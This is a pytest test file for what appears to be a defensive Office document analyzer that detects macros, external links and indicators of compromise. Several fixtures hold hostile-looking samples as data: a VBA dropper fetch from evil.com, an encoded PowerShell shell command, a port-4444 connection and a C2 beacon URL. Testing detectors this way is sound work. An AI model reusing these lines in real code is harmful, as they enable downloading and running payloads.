"""Tests for the Office document analyzer."""

import hashlib
import io
import struct
import zipfile

import pytest

from specter.office_analyzer import (
    DocFormat,
    OfficeAnalyzer,
    OfficeAnalysisResult,
    OLE2_SIGNATURE,
    VBA_COMPRESSION_MAGIC,
    _vba_decompress,
    _extract_iocs,
    _copy_token_help,
)


def _make_minimal_ooxml(with_macro: bool = False, with_external_rel: bool = False) -> bytes:
    """Build a minimal OOXML ZIP for testing."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        ct_xml = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        )
        zf.writestr("[Content_Types].xml", ct_xml)

        rel_content = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        if with_external_rel:
            rel_content += '<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://malicious.example.com/payload" TargetMode="External"/>'
        rel_content += '</Relationships>'
        zf.writestr("_rels/.rels", rel_content)

        doc_xml = '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>'
        zf.writestr("word/document.xml", doc_xml)
    return buf.getvalue()


def test_ooxml_format_detected():
    data = _make_minimal_ooxml()
    result = OfficeAnalyzer().analyze(data, "test.docx")
    assert result.file_format == DocFormat.OOXML


def test_ooxml_no_macros():
    data = _make_minimal_ooxml()
    result = OfficeAnalyzer().analyze(data)
    assert not result.has_macros
    assert result.macro_modules == []


def test_ooxml_content_types_populated():
    data = _make_minimal_ooxml()
    result = OfficeAnalyzer().analyze(data)
    assert len(result.content_types) > 0
    assert any("document.xml" in ct for ct in result.content_types)


def test_ooxml_external_relationship_detected():
    data = _make_minimal_ooxml(with_external_rel=True)
    result = OfficeAnalyzer().analyze(data)
    assert any("malicious.example.com" in rel for rel in result.external_relationships)


def test_unknown_format_detected():
    data = b"\x00\x01\x02\x03\x04\x05\x06\x07" * 64
    result = OfficeAnalyzer().analyze(data, "test.bin")
    assert result.file_format == DocFormat.UNKNOWN
    assert len(result.errors) > 0


def test_sha256_computed_correctly():
    data = _make_minimal_ooxml()
    expected = hashlib.sha256(data).hexdigest()
    result = OfficeAnalyzer().analyze(data)
    assert result.sha256 == expected


def test_file_size_recorded():
    data = _make_minimal_ooxml()
    result = OfficeAnalyzer().analyze(data)
    assert result.file_size == len(data)


def test_ioc_extraction_urls():
    text = "Set x = CreateObject(\"XMLHTTP\")\nx.Open \"GET\", \"http://evil.com/drop.exe\", False"
    iocs = _extract_iocs(text)
    assert any("evil.com" in u for u in iocs.urls)


def test_ioc_extraction_ips():
    text = "Connect to 192.168.1.100 on port 4444"
    iocs = _extract_iocs(text)
    assert "192.168.1.100" in iocs.ips


def test_ioc_extraction_shell_commands():
    text = 'Shell "powershell -enc aGVsbG8="'
    iocs = _extract_iocs(text)
    assert len(iocs.shell_commands) > 0


def test_ioc_extraction_base64():
    b64 = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZw=="
    text = f"Dim payload As String\npayload = \"{b64}\""
    iocs = _extract_iocs(text)
    assert any(b64[:20] in p for p in iocs.base64_payloads)


def test_vba_decompress_uncompressed_passthrough():
    # Data not starting with compression magic is returned as-is
    data = b"Attribute VB_Name = \"Module1\"\r\nSub Test()\r\nEnd Sub\r\n"
    result = _vba_decompress(data)
    assert result == data


def test_vba_decompress_empty():
    assert _vba_decompress(b"") == b""


def test_copy_token_help_boundaries():
    assert _copy_token_help(1) == (0x000F, 0xFFF0, 4)
    assert _copy_token_help(16) == (0x000F, 0xFFF0, 4)
    assert _copy_token_help(17) == (0x001F, 0xFFE0, 5)
    assert _copy_token_help(4096) == (0x0FFF, 0xF000, 12)


def test_risk_score_clean_doc():
    data = _make_minimal_ooxml()
    result = OfficeAnalyzer().analyze(data)
    assert result.risk_score < 40
    assert result.verdict in ("clean", "potentially_unwanted")


def test_risk_score_increases_with_external_rels():
    data_clean = _make_minimal_ooxml()
    data_ext = _make_minimal_ooxml(with_external_rel=True)
    r_clean = OfficeAnalyzer().analyze(data_clean)
    r_ext = OfficeAnalyzer().analyze(data_ext)
    # External relationship adds URL IOC which increases score
    assert r_ext.risk_score >= r_clean.risk_score


def test_to_dict_structure():
    data = _make_minimal_ooxml()
    result = OfficeAnalyzer().analyze(data)
    d = result.to_dict()
    required_keys = {
        "file_format", "sha256", "file_size", "has_macros",
        "macro_count", "auto_exec_macros", "suspicious_keywords",
        "risk_score", "verdict", "iocs", "errors",
    }
    assert required_keys <= set(d.keys())


def test_ooxml_url_ioc_from_xml_content():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("_rels/.rels", "<Relationships/>")
        zf.writestr("word/document.xml", '<w:document><w:body><w:hyperlink r:id="rId1" w:history="1"><w:r><w:t>http://c2.attacker.com/beacon</w:t></w:r></w:hyperlink></w:body></w:document>')
    data = buf.getvalue()
    result = OfficeAnalyzer().analyze(data)
    assert any("c2.attacker.com" in u for u in result.iocs.urls)
